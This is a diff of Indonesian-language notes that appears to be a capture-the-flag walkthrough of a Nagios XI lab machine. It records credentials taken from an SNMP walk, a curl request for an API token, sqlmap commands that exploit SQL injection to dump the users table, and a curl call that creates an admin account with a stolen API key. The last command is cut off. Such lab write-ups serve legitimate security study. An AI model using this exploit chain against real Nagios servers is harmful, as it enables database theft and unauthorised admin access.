@@ -1,0 +1,22 @@
+dapat creds dari snmp walk
+  - svc:XjH7VCehowpR1xZB
+
+dapat auth token dari
+  - `curl -X POST -k -L -d 'username=svc&password=XjH7VCehowpR1xZB' https://nagios.monitored.htb/nagiosxi/api/v1/authenticate/`
+      - `-k` untuk ignore ssl
+      - `-L` untuk follow redirect
+      - `-d` untuk provide data
+      - `-X` untuk method POST/GET/dll
+  - {"username":"svc","user_id":"2","auth_token":"729d7db12f3f409d8e0c6139efc1f7dfb6c3dd67","valid_min":5,"valid_until":"Mon, 22 Jan 2024 01:03:11 -0500"}
+
+
+run sqlmap
+  - `sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=`curl -XPOST -k -L 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=600' | grep token | awk -F '"' '{print $4}'`" --batch --level 5 --risk 3 -p id`
+  - dump data
+  - `sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=`curl -XPOST -k -L 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=600' | grep token | awk -F '"' '{print $4}'`" --batch --level 5 --risk 3 -p id -D nagiosxi -T xi_users --dump`
+
+
+buat creds baru dengan priv admin dengan menggunakan token yang didapat dari admin
+  - `curl -X POST -k -L -d 'username=urkee&password=urkee&name=Urkee&email=urkee@monitored.htb&auth_level=admin' "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFV
+`
+
